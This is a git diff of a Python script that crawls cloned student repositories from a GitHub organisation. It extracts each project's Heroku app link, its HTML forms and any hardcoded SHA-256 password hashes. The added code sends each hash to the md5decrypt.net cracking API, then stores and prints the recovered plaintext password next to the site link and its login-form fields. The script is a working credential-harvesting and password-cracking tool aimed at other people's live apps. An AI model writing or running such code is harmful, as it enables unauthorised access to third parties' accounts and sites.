@@ -9,22 +9,6 @@ import json
 root = 'repositories/'
 data = {}
 
-# TODO:
-#  Determine the tree of the data. How it is going to be stored
-#  data{
-#       'a2-reponame' : {
-#                     'pass': 'asdads'
-#                     'hashed': '23af2314123sd"
-#                     'repoLink': repolink
-#                     'pageLink': pageLink
-#                     'form1': {
-#                              'type': 'post'
-#                              'passfield': 'password'
-#                              'other_fields': [comment,username,radiothingy,blablabutton]
-#                              }
-#                     }
-#      'a2-reponame2'
-#      }
 
 def get_files(base_dir, file_extension):
     return glob.glob(f"{base_dir}/**/*.{file_extension}", recursive=True)
@@ -34,7 +18,9 @@ def get_files(base_dir, file_extension):
 parameters = {}
 try:
     with open('secret.json') as f:
+        print('Loading secret.json')
         parameters.update(json.load(f))
+        parameters['hash_type'] = 'sha256'
 except FileNotFoundError:
     exitcode = '''Missing secret.json
 Create a secret.json file like following'
@@ -48,7 +34,7 @@ You can get your key at https://md5decrypt.net/en/Api/'''
 
 # Goes over every repository directory
 for repo in os.listdir(root):
-
+    print('\n\nSearching in', repo)
     # Initialing repo_data
     repoData = {'repoLink': 'https://github.com/ituis18/' + repo}
 
@@ -56,26 +42,34 @@ for repo in os.listdir(root):
     readmeFile = glob.glob(f"{root + repo}/README.md")
     if len(readmeFile) != 0:
         with open(readmeFile[0]) as file:
+            print('Looking for pageLink of',repo)
             fileText = file.read()
-            # TODO:
-            #  Fix required. It finds results such as below.
-            #  Excluding symbols like []() should do the job
-            # 'pageLink': 'https://www.herokucdn.com/deploy/button.png)](https://my-blg-101-project.herokuapp.com'}
-            # 'pageLink': 'https://www.herokucdn.com/deploy/button.png)](https://my-blg-101-project.herokuapp.com'}
             pageLink = re.search(r'https://[^w].*?\.herokuapp\.com.*?|$', fileText).group()
             repoData['pageLink'] = pageLink
+            print('pageLink of {} is {}'.format(repo, pageLink))
 
     # Searching in python files
+    formHtml = ""
     allForms = []
     for pyFile in get_files(root + repo, 'py'):
-        with open(pyFile) as file:
-            fileText = file.read()
-            # Looking for form element in html codes
-            formHtml = re.findall(r'<form.*?</form>', fileText, flags=re.DOTALL)
+        if 'repl_comments.py' not in pyFile:
+            with open(pyFile) as file:
+                print('Searching in py file', pyFile)
+                fileText = file.read()
+                # Looking for form element in html codes
+                formHtml = re.findall(r'<form.*?</form>', fileText, flags=re.DOTALL)
 
-            # Looking for 64 character long strings. Character list is defined such as it
-            # finds hex. Which is what forms SHA256.
-            hashedPass = re.findall(r'[a-fA-F0-9]{64}', fileText)
+                # Looking for 64 character long strings. Character list is defined such as it
+                # finds hex. Which is what forms SHA256.
+                hashedPass = re.search(r'[a-fA-F0-9]{64}', fileText)
+                if hashedPass is not None:
+                    parameters['hash'] = hashedPass.group(0)
+                    repoData['hash'] = hashedPass.group(0)
+                    print('Decrypting "{}"...'.format(hashedPass.group()))
+                    response = requests.get('https://md5decrypt.net/en/Api/api.php', params=parameters)
+                    password = response.content.decode('utf-8')
+                    repoData['password'] = password
+                    print('Found password "{}"'.format(password))
 
         # allForms contains all the form elements of a single repo user.(Only from .py files)
         allForms.extend(formHtml)
